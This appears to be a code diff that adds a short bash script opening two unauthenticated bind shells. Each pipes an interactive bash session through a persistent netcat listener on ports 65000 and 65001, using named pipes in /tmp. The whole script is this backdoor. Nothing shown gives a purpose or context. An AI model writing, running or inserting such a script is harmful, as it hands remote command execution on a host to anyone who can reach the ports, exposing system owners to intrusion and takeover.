@@ -1,0 +1,7 @@
+#!/bin/bash
+
+rm -rf fifo{1,2}
+mkfifo /tmp/fifo{1,2}
+
+cat /tmp/fifo1 | bash -i 2>&1 | nc -lkp 65000 > /tmp/fifo1 &
+cat /tmp/fifo2 | bash -i 2>&1 | nc -lkp 65001 > /tmp/fifo2
